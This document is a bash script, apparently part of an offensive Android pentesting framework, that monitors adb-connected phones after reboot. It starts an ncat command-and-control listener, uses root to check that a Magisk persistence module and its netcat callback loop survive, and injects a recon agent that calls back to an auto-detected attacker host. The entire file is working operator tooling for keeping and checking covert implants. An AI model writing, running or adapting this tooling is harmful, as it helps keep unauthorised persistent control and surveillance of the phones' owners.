#!/usr/bin/env bash
# secV Device Monitor — detects when Android devices come online after reboot
# and checks whether persistence payloads called back.
#
# Usage:
#   ./device_monitor.sh [--c2-port 8889] [--c2-host auto] [--interval 5]
#
# What it does:
#   1. Continuously polls `adb devices` for newly online devices
#   2. When a device appears, runs basic sanity check (ping via adb)
#   3. Checks if the Magisk persistence module is still intact
#   4. Checks whether a C2 callback was received (via TCP log)
#   5. Runs inject_agent to force a fresh recon callback
#   6. Prints a color-coded status for each device

set -euo pipefail

C2_PORT="${C2_PORT:-8889}"
C2_HOST="${C2_HOST:-}"
INTERVAL="${INTERVAL:-5}"
SECV_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"
TOOL="$SECV_DIR/tools/mobile/android/android_pentest.py"
LOG_DIR="${HOME}/.secv/monitor"
mkdir -p "$LOG_DIR"

# ── Color codes ───────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

# ── Auto-detect attacker IP ───────────────────────────────────────────────────
if [ -z "$C2_HOST" ]; then
  C2_HOST=$(python3 -c "import socket; s=socket.socket(); s.connect(('8.8.8.8',80)); print(s.getsockname()[0]); s.close()" 2>/dev/null || echo "127.0.0.1")
fi

echo -e "${BOLD}[secV] Device Monitor  C2=${C2_HOST}:${C2_PORT}  interval=${INTERVAL}s${RESET}"
echo -e "${CYAN}Watching for device changes...${RESET}\n"

# Track which devices we've already seen online to detect new arrivals
declare -A SEEN_DEVICES
declare -A LAST_STATE

# ── Start C2 TCP listener (logs connections to file) ─────────────────────────
C2_LOG="$LOG_DIR/c2_callbacks.log"
start_c2_listener() {
  pkill -f "ncat.*$C2_PORT" 2>/dev/null || true
  # Multi-accept loop: log each callback IP + timestamp
  ( while true; do
      ncat -lvnp "$C2_PORT" --sh-exec \
        "echo [$(date +%T)] CALLBACK \$NCAT_REMOTE_ADDR >> $C2_LOG; cat" \
        2>/dev/null | tee -a "$C2_LOG" &
      sleep 1
    done ) &
  C2_PID=$!
  echo -e "${GREEN}[+] C2 listener on :${C2_PORT} (PID $C2_PID)  log: $C2_LOG${RESET}"
}

start_c2_listener

# ── Check if a device's C2 called back since last boot ───────────────────────
check_callback() {
  local serial="$1"
  # Get device IP from adb
  local dev_ip
  dev_ip=$(adb -s "$serial" shell "ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print \$2}' | cut -d/ -f1 | head -1" 2>/dev/null | tr -d '\r')
  [ -z "$dev_ip" ] && dev_ip="?"
  if grep -q "$dev_ip" "$C2_LOG" 2>/dev/null; then
    echo -e "  ${GREEN}[CALLBACK] ${serial} (${dev_ip}) called back to C2 ✓${RESET}"
    grep "$dev_ip" "$C2_LOG" | tail -3 | while read -r line; do
      echo -e "    ${CYAN}${line}${RESET}"
    done
    return 0
  else
    echo -e "  ${YELLOW}[NO CALLBACK] ${serial} (${dev_ip}) — no C2 connection yet${RESET}"
    return 1
  fi
}

# ── Check Magisk persistence module ──────────────────────────────────────────
check_magisk_persist() {
  local serial="$1"
  local out
  out=$(adb -s "$serial" shell "/debug_ramdisk/su -c 'ls /data/adb/modules/svc_persist/service.sh 2>/dev/null && echo PRESENT'" 2>/dev/null | tr -d '\r')
  if echo "$out" | grep -q PRESENT; then
    echo -e "  ${GREEN}[PERSIST] Magisk module svc_persist/service.sh present ✓${RESET}"
    # Also check if the nc loop is running
    local nc_pids
    nc_pids=$(adb -s "$serial" shell "/debug_ramdisk/su -c 'pgrep -f \"nc 192.168\" 2>/dev/null'" 2>/dev/null | tr -d '\r')
    if [ -n "$nc_pids" ]; then
      echo -e "  ${GREEN}[PERSIST] nc loop running (PIDs: $nc_pids) ✓${RESET}"
    else
      echo -e "  ${YELLOW}[PERSIST] module present but nc loop not yet running${RESET}"
    fi
  else
    echo -e "  ${RED}[PERSIST] svc_persist module MISSING — persistence lost!${RESET}"
    return 1
  fi
}

# ── Run inject_agent to get fresh recon ──────────────────────────────────────
run_agent_check() {
  local serial="$1"
  echo -e "  ${CYAN}[AGENT] Running inject_agent on ${serial}...${RESET}"
  local result
  result=$(echo "{\"target\":\"android\",\"params\":{\"operation\":\"inject_agent\",\"device\":\"$serial\",\"agent_mode\":\"recon\",\"c2_port\":$C2_PORT,\"c2_host\":\"$C2_HOST\",\"c2_timeout\":15}}" \
    | timeout 30 python3 "$TOOL" 2>/dev/null)
  local cves root sdk
  cves=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['data']['summary']['total_vulnerabilities'])" 2>/dev/null || echo "?")
  root=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['data']['summary']['device_rooted'])" 2>/dev/null || echo "?")
  sdk=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['data']['summary']['android_version'])" 2>/dev/null || echo "?")
  echo -e "  ${GREEN}[AGENT] Android=${sdk} rooted=${root} CVEs=${cves}${RESET}"
}

# ── Device state change handler ───────────────────────────────────────────────
on_device_online() {
  local serial="$1"
  echo -e "\n${BOLD}${GREEN}[$(date +%T)] DEVICE ONLINE: ${serial}${RESET}"
  # Brief wait for boot to settle
  sleep 3

  # Get basic info
  local model android
  model=$(adb -s "$serial" shell "getprop ro.product.model 2>/dev/null" 2>/dev/null | tr -d '\r')
  android=$(adb -s "$serial" shell "getprop ro.build.version.release 2>/dev/null" 2>/dev/null | tr -d '\r')
  echo -e "  Device: ${model} / Android ${android}"

  check_callback "$serial"    || true
  check_magisk_persist "$serial" || true
  run_agent_check "$serial"   || true
}

on_device_offline() {
  local serial="$1"
  echo -e "\n${BOLD}${RED}[$(date +%T)] DEVICE OFFLINE: ${serial}${RESET}"
}

# ── Main poll loop ────────────────────────────────────────────────────────────
while true; do
  # Get current device list
  declare -A CURRENT
  while IFS=$'\t' read -r serial state; do
    [[ "$serial" == "List"* ]] && continue
    [[ -z "$serial" ]] && continue
    CURRENT["$serial"]="$state"
  done < <(adb devices 2>/dev/null)

  # Detect state changes
  for serial in "${!CURRENT[@]}"; do
    state="${CURRENT[$serial]}"
    prev="${LAST_STATE[$serial]:-}"
    if [[ "$state" == "device" && "$prev" != "device" ]]; then
      SEEN_DEVICES["$serial"]=1
      on_device_online "$serial"
    elif [[ "$state" == "offline" && "$prev" == "device" ]]; then
      on_device_offline "$serial"
    fi
    LAST_STATE["$serial"]="$state"
  done

  # Detect devices that disappeared entirely
  for serial in "${!LAST_STATE[@]}"; do
    if [[ -z "${CURRENT[$serial]+_}" ]]; then
      [[ "${LAST_STATE[$serial]}" == "device" ]] && on_device_offline "$serial"
      unset "LAST_STATE[$serial]"
    fi
  done

  unset CURRENT
  sleep "$INTERVAL"
done
